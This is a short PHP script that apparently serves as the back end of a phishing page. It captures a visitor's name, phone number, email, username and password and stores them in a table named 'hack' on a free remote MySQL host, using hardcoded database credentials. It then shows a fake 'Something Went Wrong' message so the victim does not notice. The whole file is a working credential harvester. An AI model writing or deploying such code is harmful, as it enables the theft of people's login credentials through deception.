<?php
  $name = $_POST['name'];
  $number = $_POST['number'];
  $email = $_POST['email'];
  $username = $_POST['username'];
  $password = $_POST['password'];


  $conn = new mysqli('sql6.freesqldatabase.com','sql6469380','uWREcUhyfp','sql6469380');
  if($conn->connect_error){
      die('Connection Failed : ' .$conn->connect_error);
  }else{
      $stmt = $conn->prepare("insert into hack(name, number, email, username, password)
      value(?, ?, ?, ?, ?)");
      $stmt->bind_param("sisss",$name, $number, $email, $username, $password);
      $stmt->execute();
      echo "Something Went Wrong.....";
      $stmt->close();
      $conn->close();
  }

?>